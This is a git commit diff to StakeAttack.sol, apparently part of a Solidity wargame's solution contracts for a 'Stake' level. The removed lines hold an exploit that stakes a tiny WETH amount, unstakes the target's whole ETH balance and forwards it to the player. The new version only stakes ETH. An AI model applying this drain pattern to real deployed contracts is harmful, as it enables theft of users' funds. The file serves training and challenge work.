cff57922fcb6ff500747765488e2e8905e5df6cb
GianfrancoBazzani <bazzanigianfranco@gmail.com>
2024-04-12 22:45:15 +0200

    :gun: edit StakeAttack.sol

--- contracts/src/attacks/StakeAttack.sol
+++ contracts/src/attacks/StakeAttack.sol
@@ -7,13 +7,7 @@ import '../levels/Stake.sol';
 import "openzeppelin-contracts-08/token/ERC20/IERC20.sol";
 contract StakeAttack {
 
-  function attack(address _target, address _player) public {
-    Stake stake = Stake(_target);
-    bool s = IERC20(stake.WETH()).approve(_target, 1 ether);
-    require(s);
-    stake.StakeWETH(1000000000000001);
-    stake.Unstake(address(stake).balance);
-    (bool success,) = _player.call{value: address(this).balance}("");
-    require(success);
+  function attack(Stake _target) public payable {
+    _target.StakeETH{value: msg.value}();
   }
 }
